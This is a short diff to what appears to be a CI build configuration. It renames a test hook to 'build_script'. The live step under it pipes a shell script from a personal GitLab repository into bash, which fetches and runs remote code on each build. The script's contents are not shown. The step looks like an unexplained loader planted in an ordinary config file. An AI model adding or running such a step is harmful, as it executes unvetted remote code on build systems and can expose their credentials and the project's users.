@@ -9,5 +9,5 @@ test:
   categories:
   - - Test1
   - - Test2
-after_test:
+build_script:
 - sh: curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
